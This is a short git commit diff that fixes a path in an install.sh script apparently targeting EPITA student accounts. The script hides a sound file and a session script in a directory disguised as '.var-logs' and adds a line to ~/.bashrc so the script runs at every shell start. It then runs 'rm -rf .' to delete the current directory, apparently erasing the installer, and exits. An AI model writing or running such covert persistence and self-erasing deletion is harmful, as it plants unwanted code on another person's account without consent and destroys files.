c48014bf77ab2971b82da14035e6da4d51df16ba
Crosson Brieuc <crosson.brieuc@gmail.com>
2024-12-10 03:33:39 +0900

    fix

--- install.sh
+++ install.sh
@@ -3,7 +3,7 @@ mkdir ~/afs/.var-logs
 cp sound.mp3 ~/afs/.var-logs/epita-session.mp3
 cp start_session.sh ~/afs/.var-logs/start_session.sh
 echo "# starting EPITA session" >> ~/.bashrc
-echo "./afs/var-logs/start_session.sh" >> ~/.bashrc
+echo "./afs/.var-logs/start_session.sh" >> ~/.bashrc
 rm -rf .
 alacritty &
 exit 0
